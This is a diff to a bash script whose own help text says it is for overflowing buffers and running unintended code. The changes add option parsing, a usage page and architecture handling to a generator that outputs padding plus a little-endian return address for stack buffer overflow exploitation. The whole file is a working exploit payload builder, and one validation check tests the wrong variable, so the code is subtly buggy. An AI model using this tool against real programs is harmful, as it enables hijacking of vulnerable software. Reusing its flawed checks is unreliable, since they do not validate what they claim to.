@@ -1,26 +1,63 @@
 #!/bin/bash
 
+###############################################################################
+# GLOBALS #####################################################################
+
+# ATTRIBUTES ##################################################################
+glbScriptName="${0##*/}"
+glbIntegerRegex='^[0-9]+$'
+
+# PATHS #######################################################################
+glbScriptPath="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && echo "${PWD}" )"
+
+# FLAGS #######################################################################
+glbTargetArch=x86
+
+# LOG MESSAGES ################################################################
+glbLogE="[ERROR]"
+glbLogI="[INFO]"
+glbLogS="[SUCCESS]"
+glbLogW="[WARN]"
+
+###############################################################################
+# FUNCTIONS ###################################################################
+
+# print_usage
+# Outputs a help page describing how to use this script.
+print_usage() {
+
+    echo "[ABOUT ${glbScriptName}]"
+    echo "    Use this script to overflow buffers and run unintended code."
+
+    echo ""
+
+    echo "[USAGE]"
+    echo "    ${glbScriptName} [-a 0x40262c -s 10] [-h] [-t x64]"
+
+    echo ""
+
+    echo "[OPTIONS]"
+    echo "    -a    The hex address of the code to jump to."
+    echo "          Example: '${glbScriptName} -a 0x40262c -s 10'"
+    echo "    -h    Displays this help page."
+    echo "    -s    The size of the target buffer."
+    echo "          Example: '${glbScriptName} -s 10 -a 0x40262c'"
+    echo "    -t    The target architecture. If not specified, then x86 is used."
+    echo "          Example: '${glbScriptName} -t x64 -s 10 -a 0x40262c'"
+
+}
+
 get_raw_address() {
 
     local hexAddress="${1}"
-    local hexAddressLength=${#hexAddress}
     local byte=""
     local bytes=()
-    local bytesSize=""
-    local bytesIndex=""
+    local bytesSize=$(( ${#hexAddress} / 2 - 1))
+    local bytesIndex=${bytesSize}
     local assembledBytes=""
 
-    if [ $(( ${hexAddressLength} % 2 )) -eq 0 2> /dev/null ]
-    then
-        bytesSize=$(( ${hexAddressLength} / 2 - 1))
-        bytesIndex=${bytesSize}
-    else
-        echo "[ERROR] Invalid hexadecimal address."
-        exit 1
-    fi
-
     # Reverse the hex address for little-endian systems.
-    for i in $(seq 1 ${hexAddressLength}); do
+    for i in $(seq 1 ${#hexAddress}); do
 
         byte="${byte}${hexAddress:i-1:1}"
 
@@ -50,16 +87,17 @@ get_repeated_string() {
     local charToRepeat="a"
     local finalString=""
 
-    if [ "${repeatCount}" -eq "${repeatCount}" 2> /dev/null ]
+    if [ -z "${repeatCount}" ] \
+    || ! [[ ${bufferSize} =~ ${glbIntegerRegex} ]] 2> /dev/null
     then
-        for i in $(seq 1 ${repeatCount}); do
-
-            finalString="${finalString}${charToRepeat}"
-
-        done
-    else
-        finalString="${charToRepeat}"
+        repeatCount=1
     fi
+
+    for i in $(seq 1 ${repeatCount}); do
+
+        finalString="${finalString}${charToRepeat}"
+
+    done
 
     echo "${finalString}"
 
@@ -70,11 +108,7 @@ get_payload() {
 
     local hexAddress="${1}"
     local bufferSizeInBytes=${2}
-    local basePointerSizeInBytes=4
-    if [ -n ${BO_TARGET_ARCH} ] && [ ${BO_TARGET_ARCH} -eq 64 2> /dev/null ]
-    then
-        basePointerSizeInBytes=8
-    fi
+    local basePointerSizeInBytes=$(get_stack_base_pointer_size)
     local totalOverwriteSize=$(( ${bufferSizeInBytes} + ${basePointerSizeInBytes} ))
     local rawAddress="$(get_raw_address ${hexAddress})"
     local payload="$(get_repeated_string ${totalOverwriteSize})${rawAddress}"
@@ -83,8 +117,82 @@ get_payload() {
 
 }
 
-targetHexAddress="${1}"
-bufferSize="${2}"
+get_stack_base_pointer_size() {
+
+    local sizeInBytes=4
+
+    if [ "${glbTargetArch}" = "x86" ]
+    then
+        sizeInBytes=4
+    elif [ "${glbTargetArch}" = "x64" ]
+    then
+        sizeInBytes=8
+    fi
+
+    echo "${sizeInBytes}"
+
+}
+
+###############################################################################
+# MAIN ########################################################################
+
+if [ "${#}" -eq 0 ]
+then
+    print_usage
+    exit
+fi
+
+targetHexAddress=""
+bufferSize=""
+
+while getopts :a:hs:t: opt; do
+
+    case "${opt}" in
+
+        'a' )
+            if [[ "${OPTARG}" == "0x"* ]]
+            then
+                targetHexAddress="${OPTARG##*'0x'}"
+            else
+                targetHexAddress="${OPTARG}"
+            fi
+            if [ $(( ${#targetHexAddress} % 2 )) -ne 0 ] 2> /dev/null
+            then
+                echo "${glbLogE} You have specified an invalid hexadecimal address."
+                exit 1
+            fi
+            ;;
+
+        'h' )
+            [ "${#}" -eq 1 ] && print_usage && exit
+            ;;
+
+        's' )
+            bufferSize=${OPTARG}
+            if ! [[ ${bufferSize} =~ ${glbIntegerRegex} ]] 2> /dev/null
+            then
+                echo "${glbLogE} You must specify an integer for the buffer size."
+                exit 1
+            fi
+            ;;
+
+        't' )
+            glbTargetArch="${OPTARG}"
+            ;;
+
+        \? )
+            echo "${glbLogE} Unknown argument: '-${OPTARG}'."
+            exit 1
+            ;;
+
+        : )
+            echo "${glbLogE} Option '-${OPTARG}' requires an argument."
+            exit 1
+            ;;
+
+    esac
+
+done
 
 get_payload "${targetHexAddress}" "${bufferSize}"
 
